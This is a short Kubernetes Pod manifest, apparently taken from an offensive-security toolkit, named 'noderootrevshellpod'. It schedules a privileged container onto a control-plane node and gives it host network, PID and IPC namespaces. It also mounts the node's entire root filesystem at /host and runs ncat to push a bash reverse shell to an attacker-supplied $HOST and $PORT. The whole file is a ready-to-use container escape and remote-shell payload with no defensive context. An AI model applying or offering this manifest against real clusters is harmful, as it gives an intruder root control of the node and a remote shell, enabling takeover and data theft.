apiVersion: v1
kind: Pod
metadata:
  name: noderootrevshellpod
  labels:
spec:
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: Exists
    effect: NoSchedule
  hostNetwork: true
  hostPID: true
  hostIPC: true
  nodeName: c1m1
  containers:
  - name: noderootrevshellpod
    image: raesene/ncat
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "ncat $HOST $PORT -e /bin/bash;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
